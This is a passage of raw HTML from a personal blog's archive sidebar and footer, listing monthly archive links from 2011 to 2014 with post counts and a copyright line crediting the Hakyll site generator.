aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2014/">2014 (62)</a></label><ul class="tree-child"><li><a href="/entry/2014/12/">2014/12 (7)</a></li><li><a href="/entry/2014/11/">2014/11 (4)</a></li><li><a href="/entry/2014/10/">2014/10 (3)</a></li><li><a href="/entry/2014/09/">2014/09 (3)</a></li><li><a href="/entry/2014/08/">2014/08 (5)</a></li><li><a href="/entry/2014/07/">2014/07 (6)</a></li><li><a href="/entry/2014/06/">2014/06 (6)</a></li><li><a href="/entry/2014/05/">2014/05 (4)</a></li><li><a href="/entry/2014/04/">2014/04 (6)</a></li><li><a href="/entry/2014/03/">2014/03 (7)</a></li><li><a href="/entry/2014/02/">2014/02 (5)</a></li><li><a href="/entry/2014/01/">2014/01 (6)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2013"><label class="tree-toggle-button" for="tree-label-2013"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2013/">2013 (116)</a></label><ul class="tree-child"><li><a href="/entry/2013/12/">2013/12 (8)</a></li><li><a href="/entry/2013/11/">2013/11 (6)</a></li><li><a href="/entry/2013/10/">2013/10 (5)</a></li><li><a href="/entry/2013/09/">2013/09 (5)</a></li><li><a href="/entry/2013/08/">2013/08 (4)</a></li><li><a href="/entry/2013/07/">2013/07 (3)</a></li><li><a href="/entry/2013/06/">2013/06 (12)</a></li><li><a href="/entry/2013/05/">2013/05 (16)</a></li><li><a href="/entry/2013/04/">2013/04 (16)</a></li><li><a href="/entry/2013/03/">2013/03 (27)</a></li><li><a href="/entry/2013/02/">2013/02 (7)</a></li><li><a href="/entry/2013/01/">2013/01 (7)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2012"><label class="tree-toggle-button" for="tree-label-2012"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2012/">2012 (11)</a></label><ul class="tree-child"><li><a href="/entry/2012/12/">2012/12 (3)</a></li><li><a href="/entry/2012/09/">2012/09 (1)</a></li><li><a href="/entry/2012/07/">2012/07 (4)</a></li><li><a href="/entry/2012/04/">2012/04 (1)</a></li><li><a href="/entry/2012/03/">2012/03 (1)</a></li><li><a href="/entry/2012/01/">2012/01 (1)</a></li></ul></li><li><input class="tree-toggle" type="checkbox" id="tree-label-2011"><label class="tree-toggle-button" for="tree-label-2011"><svg class="svg-inline--fa fa-angle-right fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 320 512" data-icon="angle-right" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M278.6 233.4c12.5 12.5 12.5 32.8 0 45.3l-160 160c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L210.7 256 73.4 118.6c-12.5-12.5-12.5-32.8 0-45.3s32.8-12.5 45.3 0l160 160z" fill="currentColor"></path></svg><svg class="svg-inline--fa fa-angle-down fa-fw" focusable="false" aria-hidden="true" role="img" viewBox="0 0 448 512" data-icon="angle-down" data-prefix="fas" xmlns="http://www.w3.org/2000/svg"><path d="M201.4 374.6c12.5 12.5 32.8 12.5 45.3 0l160-160c12.5-12.5 12.5-32.8 0-45.3s-32.8-12.5-45.3 0L224 306.7 86.6 169.4c-12.5-12.5-32.8-12.5-45.3 0s-12.5 32.8 0 45.3l160 160z" fill="currentColor"></path></svg><a href="/entry/2011/">2011 (12)</a></label><ul class="tree-child"><li><a href="/entry/2011/09/">2011/09 (1)</a></li><li><a href="/entry/2011/06/">2011/06 (1)</a></li><li><a href="/entry/2011/05/">2011/05 (1)</a></li><li><a href="/entry/2011/03/">2011/03 (6)</a></li><li><a href="/entry/2011/02/">2011/02 (1)</a></li><li><a href="/entry/2011/01/">2011/01 (2)</a></li></ul></li></ul></section></div></div><div class="footer-bottom"><div class="container"><div class="copyright">© 2011-2022 Tosainu. Site generated by <a href="https://jaspervdj.be/hakyll/" target="_blank" rel="nofollow noopener">Hakyll</a>.</div></div></div></footer></body></html>
